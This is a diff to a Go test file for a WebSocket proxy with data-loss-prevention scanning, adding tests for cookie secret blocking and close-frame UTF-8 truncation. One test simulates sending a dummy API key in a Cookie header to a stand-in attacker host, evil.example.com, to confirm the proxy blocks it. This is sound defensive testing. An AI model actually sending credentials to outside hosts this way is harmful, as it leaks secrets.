@@ -10,6 +10,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 
 	"github.com/gobwas/ws"
 	"github.com/gobwas/ws/wsutil"
@@ -618,6 +619,32 @@ func TestWSProxyHeaderDLPSkipAllowlisted(t *testing.T) {
 	}
 }
 
+func TestWSProxyHeaderDLPBlockCookie(t *testing.T) {
+	// Cookies containing secrets should be blocked when ForwardCookies is enabled.
+	proxyAddr, cleanup := setupWSProxy(t, func(cfg *config.Config) {
+		cfg.WebSocketProxy.ForwardCookies = true
+	})
+	defer cleanup()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	secret := "sk-ant-" + "IOSFODNN7EXAMPLE1234567890abcdef"
+	wsURL := fmt.Sprintf("ws://%s/ws?url=ws://evil.example.com:9999", proxyAddr)
+
+	dialer := ws.Dialer{
+		Header: ws.HandshakeHeaderHTTP(http.Header{
+			"Cookie": []string{"session=" + secret},
+		}),
+		Timeout: 5 * time.Second,
+	}
+
+	_, _, _, err := dialer.Dial(ctx, wsURL)
+	if err == nil {
+		t.Fatal("expected dial to fail due to DLP in Cookie header")
+	}
+}
+
 func TestWSProxyScanDisabled(t *testing.T) {
 	backendAddr, backendCleanup := wsEchoServer(t)
 	defer backendCleanup()
@@ -829,6 +856,73 @@ func TestWriteCloseFrame(t *testing.T) {
 	}
 	if !hdr.Fin {
 		t.Error("expected Fin=true")
+	}
+}
+
+func TestWriteCloseFrame_UTF8Truncation(t *testing.T) {
+	// Build a reason that ends with multi-byte UTF-8 characters so that
+	// naive byte truncation at 123 would split a codepoint.
+	// U+4E16 (世) is 3 bytes in UTF-8. Fill reason to force a split.
+	base := strings.Repeat("a", 121) // 121 ASCII bytes
+	reason := base + "世"             // 121 + 3 = 124 bytes, exceeds 123 limit
+
+	client, server := net.Pipe()
+	defer client.Close() //nolint:errcheck // test
+	defer server.Close() //nolint:errcheck // test
+
+	go func() {
+		writeCloseFrame(server, ws.StatusNormalClosure, reason)
+	}()
+
+	hdr, err := ws.ReadHeader(client)
+	if err != nil {
+		t.Fatalf("read header: %v", err)
+	}
+	payload := make([]byte, hdr.Length)
+	if _, err := io.ReadFull(client, payload); err != nil {
+		t.Fatalf("read payload: %v", err)
+	}
+
+	// Skip the 2-byte status code; the rest must be valid UTF-8.
+	reasonBytes := payload[2:]
+	if !utf8.Valid(reasonBytes) {
+		t.Errorf("close reason is not valid UTF-8: %q", reasonBytes)
+	}
+	// The 3-byte character should be trimmed entirely (121 bytes remain).
+	if len(reasonBytes) != 121 {
+		t.Errorf("expected reason length 121, got %d", len(reasonBytes))
+	}
+}
+
+func TestWriteCloseFrame_AtomicWrite(t *testing.T) {
+	// Verify the close frame is a single contiguous frame that can be parsed.
+	client, server := net.Pipe()
+	defer client.Close() //nolint:errcheck // test
+	defer server.Close() //nolint:errcheck // test
+
+	go func() {
+		writeCloseFrame(server, ws.StatusPolicyViolation, "DLP violation")
+	}()
+
+	hdr, err := ws.ReadHeader(client)
+	if err != nil {
+		t.Fatalf("read header: %v", err)
+	}
+	if hdr.OpCode != ws.OpClose || !hdr.Fin {
+		t.Fatalf("unexpected header: op=%v fin=%v", hdr.OpCode, hdr.Fin)
+	}
+	payload := make([]byte, hdr.Length)
+	if _, err := io.ReadFull(client, payload); err != nil {
+		t.Fatalf("read payload: %v", err)
+	}
+	// First 2 bytes are status code, rest is reason.
+	code := ws.StatusCode(uint16(payload[0])<<8 | uint16(payload[1])) //nolint:gosec // test: status code from 2 bytes is always valid uint16
+	if code != ws.StatusPolicyViolation {
+		t.Errorf("expected StatusPolicyViolation, got %v", code)
+	}
+	reason := string(payload[2:])
+	if reason != "DLP violation" {
+		t.Errorf("expected reason %q, got %q", "DLP violation", reason)
 	}
 }
 
